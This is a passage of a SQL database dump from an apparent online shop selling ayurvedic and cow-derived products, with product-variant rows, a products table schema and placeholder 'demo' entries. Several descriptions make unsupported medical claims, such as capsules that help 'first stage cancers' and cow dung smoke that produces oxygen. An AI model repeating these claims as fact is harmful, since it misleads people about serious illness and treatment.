(232, 266, 'GGA-PA-G-006', 450, 400, 10, '<p>The cold press technique keeps the nutrients intact which makes the oil rich in antioxidants and full of nutrition. It is good for the skin, hair, and melting extra fat in our body, reducing the risk of coronary heart disease (CHD). In addition, it helps to lower bad cholesterol.</p>\r\n\r\n<p>100% organic and rich with natural minerals, vitamins &amp; antioxidants<br />\r\nNo chemicals, No heat process, No preservatives.</p>\r\n\r\n<p><br />\r\nNutritional Facts:</p>\r\n\r\n<p>Polyunsaturated &amp; Monounsaturated Fats,Vitamin K,&nbsp;VitaminE,&nbsp;Choline,&nbsp;Protein.<br />\r\n&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '110', 1, 0, '', '', '', '', 0, '2022-02-16 11:09:17', '2022-03-30 07:28:43', '', '', ''),
(233, 266, 'GGA-PA-S-006', 400, 380, 10, '<p>The cold press technique keeps the nutrients intact which makes the oil rich in antioxidants and full of nutrition. It is good for the skin, hair, and melting extra fat in our body, reducing the risk of coronary heart disease (CHD). In addition, it helps to lower bad cholesterol.</p>\r\n\r\n<p>100% organic and rich with natural minerals, vitamins &amp; antioxidants<br />\r\nNo chemicals, No heat process, No preservatives.</p>\r\n\r\n<p><br />\r\nNutritional Facts:</p>\r\n\r\n<p>Polyunsaturated &amp; Monounsaturated Fats,&nbsp;Vitamin K,&nbsp;Vitamin E,&nbsp;Choline,&nbsp;Protein.<br />\r\n&nbsp;</p>\r\n', '', '', '', 2, '110', 0, 0, '', '', '', '', 0, '2022-02-16 11:09:17', '2022-03-30 07:28:43', '', '', ''),
(234, 266, 'GGA-PA-N-006', 380, 350, 10, '<p>The cold press technique keeps the nutrients intact which makes the oil rich in antioxidants and full of nutrition. It is good for the skin, hair, and melting extra fat in our body, reducing the risk of coronary heart disease (CHD). In addition, it helps to lower bad cholesterol.</p>\r\n\r\n<p>100% organic and rich with natural minerals, vitamins &amp; antioxidants<br />\r\nNo chemicals, No heat process, No preservatives.</p>\r\n\r\n<p><br />\r\nNutritional Facts:</p>\r\n\r\n<p>Polyunsaturated &amp; Monounsaturated Fats,&nbsp;Vitamin K,&nbsp;Vitamin E,&nbsp;Choline,&nbsp;Protein.<br />\r\n&nbsp;</p>\r\n', '', '', '', 3, '110', 0, 0, '', '', '', '', 0, '2022-02-16 11:09:17', '2022-03-30 07:28:43', '', '', ''),
(235, 267, 'GGA-PA-G-007', 350, 350, 10, '<p>Castor oil helps heal wounds by stimulating the growth of new tissue, reducing dryness, and preventing the build-up of dead skin cells.</p>\r\n\r\n<p>&bull;&nbsp;&nbsp; &nbsp;100% organic and rich with natural minerals, vitamins &amp; antioxidants<br />\r\n&bull;&nbsp;&nbsp; &nbsp;No chemicals, No heat process, No preservatives.</p>\r\n\r\n<p><br />\r\nNutritional Facts:</p>\r\n\r\n<p>Calories, Monounsaturated Fats, Vitamin E.<br />\r\n&nbsp;</p>\r\n', '', '', '', 1, '114', 1, 0, '', '', '', '', 0, '2022-02-16 11:13:11', '2022-03-30 07:28:02', '', '', ''),
(236, 267, 'GGA-PA-S-007', 320, 320, 10, '<p>Castor oil helps heal wounds by stimulating the growth of new tissue, reducing dryness, and preventing the build-up of dead skin cells.</p>\r\n\r\n<p>&bull;&nbsp;&nbsp; &nbsp;100% organic and rich with natural minerals, vitamins &amp; antioxidants<br />\r\n&bull;&nbsp;&nbsp; &nbsp;No chemicals, No heat process, No preservatives.</p>\r\n\r\n<p><br />\r\nNutritional Facts:</p>\r\n\r\n<p>Calories, Monounsaturated Fats, Vitamin E.<br />\r\n&nbsp;</p>\r\n', '', '', '', 2, '114', 0, 0, '', '', '', '', 0, '2022-02-16 11:13:11', '2022-03-30 07:28:02', '', '', ''),
(237, 267, 'GGA-PA-N-007', 300, 300, 10, '<p>Castor oil helps heal wounds by stimulating the growth of new tissue, reducing dryness, and preventing the build-up of dead skin cells.</p>\r\n\r\n<p>&bull;&nbsp;&nbsp; &nbsp;100% organic and rich with natural minerals, vitamins &amp; antioxidants<br />\r\n&bull;&nbsp;&nbsp; &nbsp;No chemicals, No heat process, No preservatives.</p>\r\n\r\n<p><br />\r\nNutritional Facts:</p>\r\n\r\n<p>Calories, Monounsaturated Fats, Vitamin E.<br />\r\n&nbsp;</p>\r\n', '', '', '', 3, '114', 0, 0, '', '', '', '', 0, '2022-02-16 11:13:11', '2022-03-30 07:28:02', '', '', ''),
(238, 268, 'GGA-VR-G-001', 350, 350, 10, '<ul>\r\n	<li>It improves overall plant growth, improves soil and manure microbial activity, and results in fast and natural decomposition. Also prevents pest infestations and microbial infections.</li>\r\n	<li>Panchagavya is an all-purpose Liquid Fertilizer, pesticide, and insecticide.</li>\r\n	<li>Panchagavya is a combination made from cow&rsquo;s milk, ghee, curd, urine, dung.</li>\r\n</ul>\r\n', '', '', '', 1, '110', 0, 0, '', '', '', '', 0, '2022-02-16 11:21:58', '2022-03-30 07:27:21', '<ul>\r\n	<li>Mix 1 capful of Panchagavya repellent with 2 liters of water in a spray can and use.</li>\r\n	<li>Use as manure:&nbsp;Pour in your garden pots once in 2 weeks.&nbsp;</li>\r\n	<li>Use for pest-control:&nbsp;Spray diluted solution once a month or when you notice pests in the garden. Do not add any pesticides or chemicals to this solution.&nbsp;</li>\r\n</ul>\r\n', '', ''),
(239, 268, 'GGA-VR-S-001', 250, 230, 10, '<ul>\r\n	<li>It improves overall plant growth, improves soil and manure microbial activity, and results in fast and natural decomposition. Also prevents pest infestations and microbial infections.</li>\r\n	<li>Panchagavya is an all-purpose Liquid Fertilizer, pesticide, and insecticide.</li>\r\n	<li>Panchagavya is a combination made from cow&rsquo;s milk, ghee, curd, urine, dung.</li>\r\n</ul>\r\n', '', '', '', 2, '110', 0, 0, '', '', '', '', 0, '2022-02-16 11:21:58', '2022-03-30 07:27:21', '<ul>\r\n	<li>Mix 1 capful of Panchagavya repellent with 2 liters of water in a spray can and use.</li>\r\n	<li>Use as manure:&nbsp;Pour in your garden pots once in 2 weeks.&nbsp;</li>\r\n	<li>Use for pest-control:&nbsp;Spray diluted solution once a month or when you notice pests in the garden. Do not add any pesticides or chemicals to this solution.&nbsp;</li>\r\n</ul>\r\n', '', ''),
(240, 268, 'GGA-VR-N-001', 150, 150, 10, '<ul>\r\n	<li>It improves overall plant growth, improves soil and manure microbial activity, and results in fast and natural decomposition. Also prevents pest infestations and microbial infections.</li>\r\n	<li>Panchagavya is an all-purpose Liquid Fertilizer, pesticide, and insecticide.</li>\r\n	<li>Panchagavya is a combination made from cow&rsquo;s milk, ghee, curd, urine, dung.</li>\r\n</ul>\r\n', '', '', '', 3, '110', 0, 0, '', '', '', '', 0, '2022-02-16 11:21:58', '2022-03-30 07:27:21', '<ul>\r\n	<li>Mix 1 capful of Panchagavya repellent with 2 liters of water in a spray can and use.</li>\r\n	<li>Use as manure:&nbsp;Pour in your garden pots once in 2 weeks.&nbsp;</li>\r\n	<li>Use for pest-control:&nbsp;Spray diluted solution once a month or when you notice pests in the garden. Do not add any pesticides or chemicals to this solution.&nbsp;</li>\r\n</ul>\r\n', '', ''),
(241, 269, 'GGA-VR-G-002', 150, 150, 10, '<p>Jeeva amrutha is liquid organic manure popularly used for organic gardening. It is considered to be an excellent source of natural carbon, biomass, nitrogen, phosphorous potassium, and a lot of other micronutrients required for plants.</p>\r\n\r\n<p>Jeeva amrutha adds organic matter to the soil which improves soil structure, aeration, soil moisture-holding capacity, and water infiltration. Jeeva amrutha improves the quality and yield of fruits, vegetables, and other crops.</p>\r\n', '', '', '', 1, '113', 0, 0, '', '', '', '', 0, '2022-02-16 11:26:09', '2022-03-30 07:26:40', '<p>Take 100ml of Jeeva amrutha and add it to 1 liter of plain water. Mix them thoroughly. Pour the diluted liquid into the soil. Repeat the process every 15 days.&nbsp;</p>\r\n', '', ''),
(242, 269, 'GGA-VR-S-002', 150, 150, 10, '<p>Jeeva amrutha is liquid organic manure popularly used for organic gardening. It is considered to be an excellent source of natural carbon, biomass, nitrogen, phosphorous potassium, and a lot of other micronutrients required for plants.</p>\r\n\r\n<p>Jeeva amrutha adds organic matter to the soil which improves soil structure, aeration, soil moisture-holding capacity, and water infiltration. Jeeva amrutha improves the quality and yield of fruits, vegetables, and other crops.</p>\r\n', '', '', '', 2, '113', 0, 0, '', '', '', '', 0, '2022-02-16 11:26:09', '2022-03-30 07:26:40', '<p>Take 100ml of Jeeva amrutha and add it to 1 litter of plain water. Mix them thoroughly. Pour the diluted liquid into the soil. Repeat the process every 15 days.</p>\r\n', '', ''),
(243, 269, 'GGA-VR-N-002', 150, 150, 10, '<p>Jeeva amrutha is liquid organic manure popularly used for organic gardening. It is considered to be an excellent source of natural carbon, biomass, nitrogen, phosphorous potassium, and a lot of other micronutrients required for plants.</p>\r\n\r\n<p>Jeeva amrutha adds organic matter to the soil which improves soil structure, aeration, soil moisture-holding capacity, and water infiltration. Jeeva amrutha improves the quality and yield of fruits, vegetables, and other crops.</p>\r\n', '', '', '', 3, '113', 0, 0, '', '', '', '', 0, '2022-02-16 11:26:09', '2022-03-30 07:26:40', '<p>Take 100ml of Jeeva amrutha and add it to 1 litter of plain water. Mix them thoroughly. Pour the diluted liquid into the soil. Repeat the process every 15 days.</p>\r\n', '', ''),
(244, 270, 'GGA-VR-G-003', 450, 420, 10, '<p>100% organic, effective, and with no residual effect. It is a Natural product that can be used either dry or wet without harming plant tissue. &nbsp;It reduces the laying and hatching of eggs by different insects on the plants. It is specially designed for plant protection.</p>\r\n', '', '', '', 1, '113', 1, 0, '', '', '', '', 0, '2022-02-16 11:30:16', '2022-03-30 12:21:43', '', '', ''),
(245, 270, 'GGA-VR-S-003', 420, 400, 10, '<p>100% organic, effective, and with no residual effect. It is a Natural product that can be used either dry or wet without harming plant tissue. &nbsp;It reduces the laying and hatching of eggs by different insects on the plants. It is specially designed for plant protection.</p>\r\n', '', '', '', 2, '113', 0, 0, '', '', '', '', 0, '2022-02-16 11:30:16', '2022-03-30 12:21:43', '', '', ''),
(246, 270, 'GGA-VR-N-003', 400, 390, 10, '<p>100% organic, effective, and with no residual effect. It is a Natural product that can be used either dry or wet without harming plant tissue. &nbsp;It reduces the laying and hatching of eggs by different insects on the plants. It is specially designed for plant protection.</p>\r\n', '', '', '', 3, '113', 0, 0, '', '', '', '', 0, '2022-02-16 11:30:16', '2022-03-30 12:21:43', '', '', ''),
(247, 271, 'GGA-VR-G-004', 350, 350, 10, '<p>Vermicomposting is&nbsp;an eco-friendly process that recycles organic waste into compost and produces valuable nutrients. It enhances plant growth, suppresses disease in plants, increases porosity and microbial activity in the soil, and improves water retention and aeration.</p>\r\n\r\n<p>It contains water-soluble nutrients, vermicompost is a&nbsp;nutrient-rich organic fertilizer&nbsp;and soil conditioner in a form that is relatively easy for plants to absorb.</p>\r\n', '', '', '', 1, '115', 1, 0, '', '', '', '', 0, '2022-02-16 11:36:25', '2022-03-30 10:00:51', '', '', ''),
(248, 271, 'GGA-VR-S-004', 350, 340, 10, '<p>Vermicomposting is&nbsp;an eco-friendly process that recycles organic waste into compost and produces valuable nutrients. It enhances plant growth, suppresses disease in plants, increases porosity and microbial activity in the soil, and improves water retention and aeration.</p>\r\n\r\n<p>It contains water-soluble nutrients, vermicompost is a&nbsp;nutrient-rich organic fertilizer&nbsp;and soil conditioner in a form that is relatively easy for plants to absorb.</p>\r\n', '', '', '', 2, '115', 0, 0, '', '', '', '', 0, '2022-02-16 11:36:25', '2022-03-30 10:00:51', '', '', ''),
(249, 271, 'GGA-VR-N-004', 250, 250, 10, '<p>Vermicomposting is&nbsp;an eco-friendly process that recycles organic waste into compost and produces valuable nutrients. It enhances plant growth, suppresses disease in plants, increases porosity and microbial activity in the soil, and improves water retention and aeration.</p>\r\n\r\n<p>It contains water-soluble nutrients, vermicompost is a&nbsp;nutrient-rich organic fertilizer&nbsp;and soil conditioner in a form that is relatively easy for plants to absorb.</p>\r\n', '', '', '', 3, '115', 0, 0, '', '', '', '', 0, '2022-02-16 11:36:25', '2022-03-30 10:00:51', '', '', ''),
(250, 272, 'GGA-VR-G-005', 160, 150, 10, '<p>It is&nbsp;an organic fertilizer that enriches the soil and plant and provides all the nutrients required for the growth of the plant. It is a rich source of Nitrogen and valuable micro-organisms which naturally enhance soil fertility.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '113', 1, 0, '', '', '', '', 0, '2022-02-16 11:40:02', '2022-03-30 09:53:26', '<p>It has to be applied on wet soil. It must be scattered evenly on the soil. &ldquo;OR&rdquo; Dilute 50 gms in 1 liter of water and apply at the base of plants.</p>\r\n', '', ''),
(251, 272, 'GGA-VR-S-005', 150, 150, 10, '<p>It is&nbsp;an organic fertilizer that enriches the soil and plant and provides all the nutrients required for the growth of the plant. It is a rich source of Nitrogen and valuable micro-organisms which naturally enhance soil fertility.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '113', 0, 0, '', '', '', '', 0, '2022-02-16 11:40:02', '2022-03-30 09:53:26', '<p>It has to be applied on wet soil. It must be scattered evenly on the soil. &ldquo;OR&rdquo; Dilute 50 gms in 1 liter of water and apply at the base of plants.</p>\r\n', '', ''),
(252, 272, 'GGA-VR-N-005', 120, 120, 10, '<p>It is&nbsp;an organic fertilizer that enriches the soil and plant and provides all the nutrients required for the growth of the plant. It is a rich source of Nitrogen and valuable micro-organisms which naturally enhance soil fertility.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '113', 0, 0, '', '', '', '', 0, '2022-02-16 11:40:02', '2022-03-30 09:53:26', '<p>It has to be applied on wet soil. It must be scattered evenly on the soil. &ldquo;OR&rdquo; Dilute 50 gms in 1 liter of water and apply at the base of plants.</p>\r\n', '', ''),
(253, 273, 'GGA-VR-G-006', 150, 150, 10, '<p>100% pure and original cow dung cakes for daily hawan, pujan and other religious activities.</p>\n<p>Made up of original dung of Indian cow, with due care and process. Completely hand-made.</p>\n<p>Completely dried, moisture free and burns properly. Can also be used to purify the atmosphere and removes bugs and insects.</p>', 'Gobar and Homa Cake', '', '', 1, '113', 0, 0, '', '', '', '', 0, '2022-02-16 11:45:07', '2022-02-18 10:19:37', '', '', ''),
(254, 273, 'GGA-VR-G-007', 150, 150, 10, 'demo', 'demo', '', '', 2, '113', 0, 0, '', '', '', '', 0, '2022-02-16 11:45:07', '2022-02-18 10:19:37', '', '', ''),
(255, 273, 'GGA-VR-G-008', 150, 150, 20, 'demo', 'dmeo', '', '', 3, '113', 0, 0, '', '', '', '', 0, '2022-02-16 11:45:07', '2022-02-18 10:19:37', '', '', ''),
(256, 274, 'GOG1233', 300, 250, 12, 'demo', 'dmeo', '', '', 1, '81', 0, 0, '', '', '', '', 0, '2022-02-16 14:21:25', '2022-02-16 14:22:21', '', '', ''),
(257, 274, 'demo1', 400, 350, 20, 'demo', 'dmeo', '', '', 2, '92', 0, 0, '', '', '', '', 0, '2022-02-16 14:21:25', '2022-02-16 14:22:21', '', '', ''),
(258, 275, 'd453', 400, 350, 12, 'demo', 'dem', '', '', 7, '', 0, 0, '', '', '', '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', ''),
(259, 276, 'GOG-NEW-0099', 300, 260, 10, 'DEMO', 'DEMO', '', '', 7, '', 0, 0, '', '', '', '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', ''),
(260, 277, 'GOG89', 300, 250, 20, 'demo', 'demo', 'demo', '95', 7, '95', 0, 0, '', '', '', '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', ''),
(261, 278, 'GOG1233', 200, 150, 10, 'dem', 'odmeo', '', '', 1, '94', 0, 0, '', '', '', '', 0, '2022-02-17 20:14:40', '2022-02-17 20:19:48', '', '', ''),
(262, 278, 'demo1', 230, 200, 10, 'demo', 'dmeo', '', '', 2, '93', 0, 0, '', '', '', '', 0, '2022-02-17 20:14:40', '2022-02-17 20:19:48', '', '', ''),
(263, 278, 'ddww', 300, 290, 10, 'dem', 'ode', '', '', 3, '95', 0, 0, '', '', '', '', 0, '2022-02-17 20:19:48', '2022-02-17 20:19:48', '', '', ''),
(264, 279, 'GGA-VR-G-006', 350, 320, 10, '<p>Cow dung cakes have been used in traditional Indian households for yagnas, ceremonies, rituals. Pure Desi cow dung cake. 100% Pure &amp; Best, organic, and eco-friendly. Cow dung cake is used to purify the air as it is said to release oxygen when burnt with ghee. It removes the negative energy of the home and produces prana [ oxygen] in the environment. Its smoke acts as an insect repellent and a disinfectant.</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '113', 1, 0, '', '', '', '', 0, '2022-02-18 10:38:15', '2022-03-30 09:49:14', '', '', ''),
(265, 279, 'GGA-VR-S-007', 250, 250, 10, '<p>Cow dung cakes have been used in traditional Indian households for yagnas, ceremonies, rituals. Pure Desi cow dung cake. 100% Pure &amp; Best, organic, and eco-friendly. Cow dung cake is used to purify the air as it is said to release oxygen when burnt with ghee. It removes the negative energy of the home and produces prana [ oxygen] in the environment. Its smoke acts as an insect repellent and a disinfectant.</p>\r\n', '', '', '', 2, '113', 0, 0, '', '', '', '', 0, '2022-02-18 10:38:15', '2022-03-30 09:49:14', '', '', ''),
(266, 279, 'GGA-VR-N-008', 200, 150, 10, '<p>Cow dung cakes have been used in traditional Indian households for yagnas, ceremonies, rituals. Pure Desi cow dung cake. 100% Pure &amp; Best, organic, and eco-friendly. Cow dung cake is used to purify the air as it is said to release oxygen when burnt with ghee. It removes the negative energy of the home and produces prana [ oxygen] in the environment. Its smoke acts as an insect repellent and a disinfectant.</p>\r\n', '', '', '', 3, '113', 0, 0, '', '', '', '', 0, '2022-02-18 10:38:15', '2022-03-30 09:49:14', '', '', ''),
(267, 280, 'GGA-GA-G-009', 250, 175, 10, '<p>Helps in 1st stage of cancers, purifying blood, controlling high BP, Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Sarpagandha Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '88', 1, 0, '', '', '', '', 0, '2022-02-18 11:52:28', '2022-03-30 05:27:40', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(268, 280, 'GGA-GA-S-009', 200, 180, 10, '<p>Helps in 1st stage of cancers, purifying blood, controlling high BP, Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Sarpagandha Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '88', 0, 0, '', '', '', '', 0, '2022-02-18 11:52:28', '2022-03-30 05:27:40', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(269, 280, 'GGA-GA-N-009', 200, 200, 10, '<p>Helps in 1st stage of cancers, purifying blood, controlling high BP, Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Sarpagandha Powder</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '88', 0, 0, '', '', '', '', 0, '2022-02-18 11:52:28', '2022-03-30 05:27:40', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(270, 281, 'GGA-GA-G-010', 200, 180, 10, '<p>Helps in relieving all kinds of pain, beneficial in chronic fever, cough, cold, respiratory tract infections, and other viral infections. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Sarpagandha Powder.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '88', 1, 0, '', '', '', '', 0, '2022-02-18 11:57:45', '2022-03-30 08:44:37', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(271, 281, 'GGA-GA-S-010', 180, 160, 10, '<p>Helps in relieving all kinds of pain, beneficial in chronic fever, cough, cold, respiratory tract infections, and other viral infections. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Sarpagandha Powder.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '88', 0, 0, '', '', '', '', 0, '2022-02-18 11:57:45', '2022-03-30 08:44:37', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(272, 281, 'GGA-GA-N-010', 160, 150, 10, '<p>Helps in relieving all kinds of pain, beneficial in chronic fever, cough, cold, respiratory tract infections, and other viral infections. Increases immunity.</p>\r\n\r\n<p><strong>Ingredients:</strong><br />\r\nGaumutra Ghan, Sarpagandha Powder.</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '88', 0, 0, '', '', '', '', 0, '2022-02-18 11:57:45', '2022-03-30 08:44:37', '<p>Dosage: 2 capsules, twice a day or follow as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(273, 282, 'GGA-KA-G-019', 300, 250, 10, '<p>Arjun Ghrita is very useful in heart-related issues. It is one of the most ancient ayurvedic formulas to keep your heart healthy, keep the cholesterol in check, and control Blood pressure.&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Arjuna Swarasa, Gogritha, Arjuna Kalka</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 1, '110', 1, 0, '', '', '', '', 0, '2022-02-18 12:04:41', '2022-03-30 12:27:58', '<p>Dosage:3 to 6 gms twice a day or as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(274, 282, 'GGA-KA-S-019', 250, 200, 10, '<p>Arjun Ghrita is very useful in heart-related issues. It is one of the most ancient ayurvedic formulas to keep your heart healthy, keep the cholesterol in check, and Control Blood Pressure.&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Arjuna Swarasa, Gogritha, Arjuna Kalka</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 2, '110', 1, 0, '', '', '', '', 0, '2022-02-18 12:04:41', '2022-03-30 12:27:58', '<p>Dosage:3 to 6 gms twice a day or as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(275, 282, 'GGA-KA-N-019', 200, 150, 10, '<p>Arjun Ghrita is very useful in heart-related issues. It is one of the most ancient ayurvedic formulas to keep your heart healthy, keep the cholesterol in check, and Control Blood Pressure.&nbsp;</p>\r\n\r\n<p><strong>Ingredients:</strong></p>\r\n\r\n<p>Arjuna Swarasa, Gogritha, Arjuna Kalka</p>\r\n\r\n<p>&nbsp;</p>\r\n', '', '', '', 3, '110', 1, 0, '', '', '', '', 0, '2022-02-18 12:04:41', '2022-03-30 12:27:58', '<p>Dosage:3 to 6 gms twice a day or as directed by the ayurvedic doctor.</p>\r\n', '', ''),
(276, 283, 'GOG89', 300, 400, 12, 'demo', 'dmeo', 'dne', '92', 7, '92', 0, 0, '', '', '', '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', ''),
(277, 284, 'GOG89', 230, 200, 10, '&lt;p&gt;demo&lt;/p&gt;', '&lt;p&gt;dmeo&lt;/p&gt;', '', '', 7, '', 0, 0, '', '', '', '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', ''),
(278, 301, 'GOG1233', 119, 212, 12, '&lt;p&gt;dme&lt;/p&gt;', '&lt;p&gt;dd&lt;/p&gt;', '', '', 1, '93', 1, 0, '', '', '', '', 0, '2022-03-25 15:07:38', '2022-03-25 15:08:31', '', '', ''),
(279, 301, 'd123', 200, 190, 20, '&lt;p&gt;dme&lt;/p&gt;', '&lt;p&gt;dmdm&lt;/p&gt;', '', '', 2, '93', 0, 0, '', '', '', '', 0, '2022-03-25 15:07:38', '0000-00-00 00:00:00', '', '', ''),
(280, 302, 'GOG1233', 500, 450, 21, '&lt;p&gt;em&lt;/p&gt;', '&lt;p&gt;em&lt;/p&gt;', '', '', 1, '75', 0, 0, '', '', '', '', 0, '2022-03-25 15:09:55', '0000-00-00 00:00:00', 'd', '', ''),
(281, 303, 'GGA-DP-M-001', 50, 48, 100, '&lt;p&gt;Milk&lt;/p&gt;', '&lt;p&gt;Milk&lt;/p&gt;', '', '', 7, '114', 0, 0, '', '', '', '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', ''),
(282, 315, '123456', 123, 123, 12, '&lt;p&gt;Demo&lt;/p&gt;', '&lt;p&gt;Demo&lt;/p&gt;', '', '', 7, '75', 0, 0, '', '', '', '', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '', '', ''),
(283, 319, 'GGA-VA-CB-001', 150, 150, 10, '&lt;p&gt;Cowdung Bricks&lt;/p&gt;', '', '', '', 3, '113', 0, 0, '', '', '', '', 0, '2022-04-01 04:30:26', '0000-00-00 00:00:00', '', '', ''),
(284, 320, 'GGA-MK-001', 150, 150, 10, '<p>HI</p>\r\n', '', '', '', 3, '117', 1, 0, '', '', '', '', 0, '2022-04-01 04:35:15', '2022-04-01 04:38:06', '', '', ''),
(285, 321, '02', 150, 150, 10, '<p>Hi</p>\r\n', '', '', '', 3, '117', 0, 0, '', '', '', '', 0, '2022-04-01 04:41:57', '2022-04-01 05:16:05', '', '', ''),
(286, 322, '03', 150, 150, 10, '&lt;p&gt;Cheese &lt;/p&gt;', '', '', '', 3, '97', 0, 0, '', '', '', '', 0, '2022-04-01 04:47:20', '0000-00-00 00:00:00', '', '', ''),
(287, 323, '04', 150, 150, 10, '&lt;p&gt;Butter &lt;/p&gt;', '', '', '', 3, '', 0, 0, '', '', '', '', 0, '2022-04-01 05:02:39', '0000-00-00 00:00:00', '', '', ''),
(288, 324, '05', 200, 200, 10, '<p>Milk</p>\r\n', '', '', '', 3, '97', 1, 0, '', '', '', '', 0, '2022-04-01 05:06:30', '2022-04-01 05:08:05', '', '', ''),
(289, 325, '06', 150, 150, 10, '<p>Paneer&nbsp;</p>\r\n', '', '', '', 3, '97', 1, 0, '', '', '', '', 0, '2022-04-01 05:11:57', '2022-04-01 05:13:45', '', '', ''),
(290, 326, '07', 150, 150, 10, '<p>Curd&nbsp;</p>\r\n', '', '', '', 3, '77', 1, 0, '', '', '', '', 0, '2022-04-01 05:18:12', '2022-04-01 05:19:09', '', '', ''),
(291, 327, 'GGA-VA-CF-001', 200, 200, 10, '&lt;p&gt;Cowdung Fertilizer&lt;/p&gt;', '', '', '', 3, '113', 0, 0, '', '', '', '', 0, '2022-04-01 05:25:13', '0000-00-00 00:00:00', '', '', ''),
(292, 328, 'GGA-VA-CP-001', 150, 150, 10, '<p>Cowdung Powder</p>\r\n', '', '', '', 3, '113', 0, 0, '', '', '', '', 0, '2022-04-01 05:28:33', '2022-04-01 16:01:27', '', '', '');

-- --------------------------------------------------------

--
-- Table structure for table `products`
--

CREATE TABLE `products` (
  `id` int(11) NOT NULL,
  `cat_id` int(11) NOT NULL,
  `subcat_id` int(11) NOT NULL,
  `sub_sub_id` int(11) NOT NULL,
  `name` text NOT NULL,
  `ptitle` varchar(255) NOT NULL,
  `page_url` text NOT NULL,
  `material_id` int(11) NOT NULL,
  `color_id` int(11) NOT NULL,
  `pcode` text NOT NULL,
  `vase` int(11) NOT NULL,
  `overview` text NOT NULL,
  `user_id` int(11) NOT NULL,
  `created_date` datetime NOT NULL,
  `modified_date` datetime NOT NULL,
  `status` int(11) NOT NULL,
  `home_page` int(11) NOT NULL DEFAULT '0' COMMENT '0->no; 1->yes',
  `meta_keywords` text NOT NULL,
  `meta_description` text NOT NULL,
  `bundle_product` tinyint(2) NOT NULL,
  `special` tinyint(1) NOT NULL,
  `exclusive` tinyint(1) NOT NULL,
  `tax` varchar(50) NOT NULL,
  `minimum_buy` int(11) NOT NULL,
  `how_to_use` text NOT NULL,
  `youtube` varchar(200) NOT NULL,
  `youtubelink` varchar(200) NOT NULL,
  `ptype` varchar(50) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `products`
--

INSERT INTO `products` (`id`, `cat_id`, `subcat_id`, `sub_sub_id`, `name`, `ptitle`, `page_url`, `material_id`, `color_id`, `pcode`, `vase`, `overview`, `user_id`, `created_date`, `modified_date`, `status`, `home_page`, `meta_keywords`, `meta_description`, `bundle_product`, `special`, `exclusive`, `tax`, `minimum_buy`, `how_to_use`, `youtube`, `youtubelink`, `ptype`) VALUES
(12, 1, 12, 0, 'Goumutra Asav', '', 'gomutra-asav', 1, 1, 'KA/GA/01', 0, '<p>For respiratory infections like asthma, cold, cough, breathing &amp; lungs infections.</p>\r\n<p>Ayurvedic medicine for asthma, bronchitis, cough, allergy, breathing, and lung infections.</p>\r\n<p>&nbsp;Ingredients: &nbsp;</p>\r\n<ul>\r\n<li>Cow Urine</li>\r\n<li>Jaggery</li>\r\n<li>Honey</li>\r\n<li>Ginger</li>\r\n<li>Pippali &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</li>\r\n</ul>', 1, '2022-04-07 03:51:50', '2022-08-03 05:07:18', 0, 0, '', '', 0, 0, 0, '12', 0, '<p>Dosage: Take 10 ml mixed with water twice a day after food or follow as directed by the ayurvedic doctor.&nbsp;</p>', '', '', ''),
